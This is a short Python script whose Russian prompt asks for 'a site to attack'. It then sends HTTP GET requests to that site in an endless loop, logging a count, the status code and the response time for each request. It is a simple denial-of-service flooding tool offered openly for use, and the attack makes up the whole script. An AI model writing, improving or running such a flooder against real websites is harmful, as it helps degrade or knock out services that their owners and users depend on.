import requests
from datetime import datetime
a = input("Введите сайт для атаки: ")
i = 0
while True:
    start = datetime.now()
    re = requests.get(a)
    end = datetime.now()
    i += 1
    print(i,"|",re.status_code,"|     ",end - start)
input()